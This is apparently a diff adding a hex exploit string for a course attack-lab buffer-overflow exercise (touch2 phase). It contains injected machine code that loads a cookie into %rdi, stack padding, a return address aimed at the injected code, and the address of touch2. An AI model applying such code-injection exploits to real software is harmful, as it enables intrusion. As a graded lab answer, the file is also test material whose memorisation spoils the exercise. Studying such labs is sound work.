@@ -1,0 +1,7 @@
+48 c7 c7 a0 89 56 74 c3 /* Mov cookie to %rdi */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+88 13 66 55 00 00 00 00 /* Adress to stack pointer, move instruction will be executed */
+68 12 40 00 00 00 00 00 /* Adress to touch2 */
